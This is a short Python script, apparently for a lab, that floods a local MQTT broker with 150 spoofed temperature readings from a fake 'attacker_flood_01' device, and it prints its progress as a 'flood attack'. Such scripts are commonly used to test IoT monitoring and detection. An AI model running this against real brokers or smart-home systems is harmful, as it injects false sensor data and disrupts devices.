import time
from datetime import datetime
import paho.mqtt.client as mqtt

BROKER = "localhost"
PORT = 1883
TOPIC = "home/temperature"

client = mqtt.Client()
client.connect(BROKER, PORT, 60)

print("Starting MQTT Flood Attack...")

for i in range(150):
    payload = {
        "device": "attacker_flood_01",
        "value": i,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    client.publish(TOPIC, str(payload))
    print(f"[FLOOD ATTACK] Message {i + 1} sent to {TOPIC}")
    time.sleep(0.03)

print("MQTT Flood Attack completed.")